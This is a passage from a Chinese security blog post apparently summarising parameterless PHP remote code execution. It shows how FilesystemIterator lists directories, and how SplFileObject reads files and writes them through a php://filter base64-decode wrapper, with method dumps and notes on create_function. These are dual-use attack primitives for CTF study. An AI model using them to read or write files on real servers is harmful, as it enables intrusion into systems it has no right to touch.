    <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=></span> getInode
    <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=></span> getSize
    <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=></span> getOwner
    <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=></span> getGroup
    <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=></span> getATime
    <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=></span> getMTime
    <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=></span> getCTime
    <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=></span> getType
    <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=></span> isWritable
    <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=></span> isReadable
    <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=></span> isExecutable
    <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=></span> isFile
    <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=></span> isDir
    <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=></span> isLink
    <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=></span> getLinkTarget
    <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=></span> getRealPath
    <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFileInfo
    <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPathInfo
    <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=></span> openFile
    <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=></span> setFileClass
    <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=></span> setInfoClass
    <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=></span> _bad_state_ex
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(1)<code>__FILE__</code>常量</p>
<p>当前文件的路径</p>
<p><code>/box1/box/script.php</code></p>
<p><code>dirname(__FILE__)</code></p>
<p>当前文件目录的路径</p>
<p><code>/box1/box</code></p>
<p>2.<code>FilesystemIterator</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$iterator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 创建当前目录的迭代器</span>
<span class="token comment">#$iterator = new FilesystemIterator('.');   //一样的用法</span>

<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token operator">-></span><span class="token function">valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 检测迭代器是否到底了</span>
    <span class="token keyword">echo</span> <span class="token variable">$iterator</span><span class="token operator">-></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':'</span><span class="token punctuation">,</span> <span class="token variable">$iterator</span><span class="token operator">-></span><span class="token function">getCTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$iterator</span><span class="token operator">-></span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 游标往后移动</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//输出所有方法</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$iterator</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">Array</span>  <span class="token comment">//所有方法</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=></span> __construct
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=></span> rewind
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=></span> next
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=></span> key
    <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=></span> current
    <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFlags
    <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=></span> setFlags
    <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFilename
    <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=></span> getExtension
    <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=></span> getBasename
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=></span> isDot
    <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=></span> valid
    <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=></span> seek
    <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=></span> __toString
    <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPath
    <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPathname
    <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPerms
    <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=></span> getInode
    <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=></span> getSize
    <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=></span> getOwner
    <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=></span> getGroup
    <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=></span> getATime
    <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=></span> getMTime
    <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=></span> getCTime
    <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=></span> getType
    <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=></span> isWritable
    <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=></span> isReadable
    <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=></span> isExecutable
    <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=></span> isFile
    <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=></span> isDir
    <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=></span> isLink
    <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=></span> getLinkTarget
    <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=></span> getRealPath
    <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFileInfo
    <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPathInfo
    <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=></span> openFile
    <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=></span> setFileClass
    <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=></span> setInfoClass
    <span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=></span> _bad_state_ex
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="二、可读取文件类"><a href="#二、可读取文件类" class="headerlink" title="二、可读取文件类"></a>二、可读取文件类</h4><p>1.<code>SplFileObject</code> </p>
<p>在此函数中，URL 可作为文件名，不过也要受到 <code>allow_url_fopen</code> 影响。</p>
<p>该类有两个参数，一个是文件名，一个是文件操作</p>
<p>（1）读文件</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'b.txt'</span><span class="token punctuation">;</span>
<span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">;</span>
<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出所有方法</span>
<span class="token keyword">echo</span> <span class="token variable">$fp</span><span class="token operator">-></span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token operator">-></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//fread() 返回该文件内容 参数是字符个数（int）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">Array</span>  <span class="token comment">//所有方法</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=></span> __construct
    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=></span> rewind
    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=></span> eof
    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=></span> valid
    <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=></span> fgets
    <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=></span> fgetcsv
    <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=></span> fputcsv
    <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=></span> setCsvControl
    <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=></span> getCsvControl
    <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=></span> flock
    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=></span> fflush
    <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=></span> ftell
    <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=></span> fseek
    <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=></span> fgetc
    <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=></span> fpassthru
    <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=></span> fgetss
    <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=></span> fscanf
    <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=></span> fwrite
    <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=></span> fread
    <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=></span> fstat
    <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=></span> ftruncate
    <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=></span> current
    <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=></span> key
    <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=></span> next
    <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=></span> setFlags
    <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFlags
    <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=></span> setMaxLineLen
    <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=></span> getMaxLineLen
    <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=></span> hasChildren
    <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=></span> getChildren
    <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=></span> seek
    <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=></span> getCurrentLine
    <span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=></span> __toString
    <span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPath
    <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFilename
    <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=></span> getExtension
    <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=></span> getBasename
    <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPathname
    <span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPerms
    <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=></span> getInode
    <span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=></span> getSize
    <span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=></span> getOwner
    <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">=></span> getGroup
    <span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span> <span class="token operator">=></span> getATime
    <span class="token punctuation">[</span><span class="token number">44</span><span class="token punctuation">]</span> <span class="token operator">=></span> getMTime
    <span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">]</span> <span class="token operator">=></span> getCTime
    <span class="token punctuation">[</span><span class="token number">46</span><span class="token punctuation">]</span> <span class="token operator">=></span> getType
    <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">]</span> <span class="token operator">=></span> isWritable
    <span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token operator">=></span> isReadable
    <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">]</span> <span class="token operator">=></span> isExecutable
    <span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=></span> isFile
    <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">]</span> <span class="token operator">=></span> isDir
    <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span> <span class="token operator">=></span> isLink
    <span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">]</span> <span class="token operator">=></span> getLinkTarget
    <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span> <span class="token operator">=></span> getRealPath
    <span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">]</span> <span class="token operator">=></span> getFileInfo
    <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> <span class="token operator">=></span> getPathInfo
    <span class="token punctuation">[</span><span class="token number">57</span><span class="token punctuation">]</span> <span class="token operator">=></span> openFile
    <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">]</span> <span class="token operator">=></span> setFileClass
    <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span> <span class="token operator">=></span> setInfoClass
    <span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span> <span class="token operator">=></span> _bad_state_ex
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(2)第二个参数及其作用</p>
<ul>
<li>打开模式为w，那么就是只写，不读</li>
<li>打开模式为r，那么就是只读，不写</li>
<li>打开模式为w+，那么指针就是在文件开头处读写</li>
<li>打开模式为a+，那么指针就是在文件末尾处读写</li>
</ul>
<p>（3）写文件（filter过滤器，实现base64编码）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$f</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://filter/convert.base64-decode/resource=b.txt'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$f</span><span class="token operator">-></span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y3Rm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><code>php://filter/convert.base64-decode/resource=b.txt</code></p>
<p>这个就是在写入文件的时候，自动进行base64解码</p>
<p>那么使用<code>fwrite</code>的时候，写入base64编码后的内容，最后在文件中就是正常的内容了</p>
<p><strong>当然读取文件也可以使用过滤器，读取解码后的内容或者编码后的内容</strong></p>
<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1、<code>...array()</code>三个点</p>
<p>这个方式一开始看不懂，研究了一下，就是将数组的各个元素分离</p>
<p>例如：</p>
<p><code>...[&#39;q&#39;,&#39;w&#39;,&#39;e&#39;]</code></p>
<p>返回的就是三个字符 <code>q,w,e</code></p>
<p>2、<code>create_function</code>函数</p>
<p>根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
<p>重点注意第二个参数</p>
<p>举个例子：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$newfunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a,$b'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return "ln($a) + ln($b) = " . log($a * $b);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"New anonymous function: <span class="token interpolation"><span class="token variable">$newfunc</span></span>\n"</span><span class="token punctuation">;</span> <span class="token comment">//独一无二的名字 lambda_1</span>
<span class="token keyword">echo</span> <span class="token variable">$newfunc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token constant">M_E</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>等价于 =&gt;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">lambda_1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token string double-quoted-string">"ln(<span class="token interpolation"><span class="token variable">$a</span></span>) + ln(<span class="token interpolation"><span class="token variable">$b</span></span>) = "</span> <span class="token operator">.</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">*</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Siii0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/" title="无参RCE 总结">http://siii0.github.io/%E6%97%A0%E5%8F%82RCE%E6%80%BB%E7%BB%93/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/Linux%E5%8F%8D%E5%BC%B9shell/" rel="prev" title="Linux反弹shell（文件描述符和重定向）"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">Linux反弹shell（文件描述符和重定向）</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98FinalSQL/" rel="next" title="BUUCTF-极客大挑战[FinalSql]"><span class="post-nav-text">BUUCTF-极客大挑战[FinalSql]</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; Wed Jan 05 2022 08:00:00 GMT+0800 (中国标准时间) – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Siii0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v6.0.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>